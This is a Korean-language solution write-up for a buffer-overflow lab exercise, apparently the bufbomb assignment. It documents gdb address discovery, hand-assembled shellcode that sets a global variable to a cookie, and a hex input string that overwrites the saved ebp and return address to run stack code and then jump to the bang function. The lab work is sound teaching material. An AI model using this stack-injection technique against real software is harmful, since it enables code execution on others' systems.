/*

mission2의 목표는 global_value 전역변수를 내 쿠키값으로 설정하고,
getbuf가 리턴될때 bang 함수가 호출되게 하는것입니다.

힌트에 써져있는것처럼, ret 에 함수주소 대신에 스택을 가리키게 하여 스택을
실행시키면 됩니다. 정말 다행히도 스택 주소가 고정되어있어서 그냥 gdb로
getbuf 함수를 실행할 당시에 스택 주소가 어떻게 되는지를 알아내서 스택에 적절히
global_value 값 세팅하고, bang 함수 호출하는 어셈코드를 넣으면 될것같습니다.

`gdb ./bufbomb`를 켜서 gdb에 `x/x &global_value` 를 치면 global_value의 위치를
알려줍니다. gdb로 스택을 보고싶으면 `x/32x $esp`를 하면 스택을 다 볼 수
있습니다. 버퍼에 임의의 문자열을 놓고 `x/~x $esp`에서 제가 넣어준 값이 스택의
어느 위치에 저장되었는지를 찾아보았더니 `0x55682eb8` 였습니다.

&bang           0x08048c9d    9d 8c 04 08
쿠키값은        0x70fe5747    47 57 fe 70
&global_value   0x0804d100    00 d1 04 08
&버퍼           0x55682eb8    b8 2e 68 55


`global_value = cookie; return;` 의 opcode는 아래와 같습니다.

    movl $0x70fe5747, 0x0804d100
    ret

    c7 04 25 00 d1 04 08
    47 57 fe 70
    c3

*/

c7 04 25 00 d1 04 08
47 57 fe 70
c3
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
10 2f 68 55 /* saved ebp */
b8 2e 68 55 /* return addr */

/*

그리고 스택을 더 덮어써서, 내가 써준 opcode에서 return을 하면, 어디로 날라갈지
지정해줄 수 있다. 00 01 02 03 ~ 이런걸 버퍼에 넣어주고 $esi 가 어디로 튀는지
보면 return address가 어디에 저장되어있는지 알 수 있을것이다.

*/

9d 8c 04 08 /* return addr */
